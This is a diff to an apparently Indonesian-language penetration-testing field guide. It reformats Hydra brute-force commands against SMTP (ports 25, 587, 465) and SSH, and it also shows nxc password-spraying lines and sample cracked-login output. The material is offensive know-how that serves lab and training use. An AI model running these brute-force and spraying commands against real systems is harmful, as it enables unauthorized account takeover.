@@ -384,15 +384,14 @@ nc -vn $TARGET 25
 ```
 
 ```bash
-# 2. Bruteforce Password Akun SMTP via Hydra
-# A. Port 25 (Standard Plaintext / STARTTLS):
-hydra -l jordan -P /usr/share/wordlists/rockyou.txt $TARGET smtp -s 25 -t 4 -f -V
+# Menggunakan skema protokol (Sangat direkomendasikan): 
+hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 25 -t 4 -f -V smtp://$TARGET
 
-# B. Port 587 (Submission dengan STARTTLS):
-hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 587 $TARGET smtp -t 4 -f -V
+# B. Port 587 (Submission dengan STARTTLS): 
+hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 587 -t 4 -f -V smtp://$TARGET 
 
-# C. Port 465 (SMTPS / Direct Implicit SSL):
-hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 465 -S $TARGET smtp -t 4 -f -V
+# C. Port 465 (SMTPS / Direct Implicit SSL): 
+hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 465 -S -t 4 -f -V smtp://$TARGET
 ```
 
 ---
@@ -497,7 +496,10 @@ nxc ssh $TARGET -u users_clean.txt -p 'Password123!' --continue-on-success
 nxc ssh $TARGET -u users_clean.txt -p 'Welcome2024!' --continue-on-success
 
 # 3. OPSI B: Password BRUTEFORCE (SATU user bernilai tinggi terhadap wordlist besar rockyou.txt):
-hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4 -f -V
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ssh://$TARGET
+
+# Atau jika format IP target dan layanan dipisah di paling akhir:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V $TARGET ssh
 ```
 
 ---
@@ -683,7 +685,7 @@ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.
 
 #### Step 3: Password Spraying terhadap SSH ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh))
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4 -f
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ssh://$TARGET
 ```
 ```text
 [22][ssh] host: 10.10.11.85   login: admin   password: password123
@@ -2681,4 +2683,4 @@ SMTP Results
 
 ---
 
-> **➡️ NEXT:** Setelah SMTP selesai — kamu punya user list dan mungkin domain name. Lanjut ke **`[09. DNS Enumeration & Reconnaissance Workflow — Master Field Guide](/docs/dns)`** untuk Zone Transfer (AXFR) dan subdomain discovery yang akan melengkapi peta infrastruktur target secara menyeluruh.
+> **➡️ NEXT:** Setelah SMTP selesai — kamu punya user list dan mungkin domain name. Lanjut ke **[09. DNS Enumeration & Reconnaissance Workflow — Master Field Guide](/docs/dns)** untuk Zone Transfer (AXFR) dan subdomain discovery yang akan melengkapi peta infrastruktur target secara menyeluruh.
